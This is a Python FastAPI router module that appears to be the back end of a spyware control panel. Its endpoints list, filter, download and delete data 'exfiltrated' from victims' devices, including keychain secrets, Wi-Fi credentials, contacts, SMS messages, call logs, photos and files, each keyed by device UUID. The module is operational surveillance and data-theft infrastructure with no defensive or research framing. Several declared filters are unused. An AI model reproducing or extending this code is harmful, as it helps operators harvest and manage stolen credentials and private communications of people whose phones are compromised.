from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from sqlalchemy import desc
from pathlib import Path
from ..database import get_db, ExfilData
from ..auth import get_current_user
from ..schemas import ExfilDataResponse
from typing import Optional, List

router = APIRouter(prefix="/api/exfil", tags=["exfil"], redirect_slashes=False)

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent


@router.get("", response_model=List[ExfilDataResponse])
async def get_exfil(
    skip: int = 0,
    limit: int = 100,
    device_uuid: Optional[str] = None,
    category: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).order_by(desc(ExfilData.uploaded_at))
    
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    if category:
        query = query.filter(ExfilData.category == category)
    
    exfil = query.offset(skip).limit(limit).all()
    return exfil


@router.get("/keychain")
async def get_keychain(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    account: Optional[str] = None,
    service: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'keychain').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/wifi")
async def get_wifi(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    ssid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'wifi').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/contacts")
async def get_contacts(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    name: Optional[str] = None,
    phone: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'contacts').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/sms")
async def get_sms(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    phone: Optional[str] = None,
    type: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'sms').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/calls")
async def get_calls(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    phone: Optional[str] = None,
    type: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'calls').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/photos")
async def get_photos(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'photos').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/files")
async def get_files(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'files').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/{exfil_id}", response_model=ExfilDataResponse)
async def get_exfil_item(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    exfil = db.query(ExfilData).filter(ExfilData.id == exfil_id).first()
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil data not found")
    return exfil


@router.get("/{exfil_id}/download")
async def download_exfil(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    exfil = db.query(ExfilData).filter(ExfilData.id == exfil_id).first()
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil data not found")
    
    file_path = Path(exfil.file_path)
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(str(file_path), filename=file_path.name)


@router.delete("/{exfil_id}")
async def delete_exfil(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    exfil = db.query(ExfilData).filter(ExfilData.id == exfil_id).first()
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil data not found")
    
    file_path = Path(exfil.file_path)
    if file_path.exists():
        file_path.unlink()
    
    db.delete(exfil)
    db.commit()
    return {"message": "Exfil data deleted"}
